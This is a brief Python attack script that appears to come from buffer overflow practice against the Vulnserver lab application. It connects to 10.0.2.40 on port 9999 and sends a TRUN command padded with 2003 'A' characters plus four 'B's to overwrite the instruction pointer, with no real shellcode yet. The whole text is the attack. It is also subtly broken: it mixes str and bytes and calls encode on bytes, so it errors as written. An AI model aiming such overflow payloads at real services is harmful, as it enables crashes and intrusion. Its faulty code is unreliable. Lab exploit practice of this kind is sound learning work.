#!/usr/bin/python3
import sys, socket

shellcode = "A" * 2003 + b"B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.0.2.40', 9999))
	payload = b'TRUN /:./' + shellcode
	s.send((payload.encode()))
	s.close()
	
	
except Exception as e:
	print(f"Error: {e}")
	sys.exit()
			
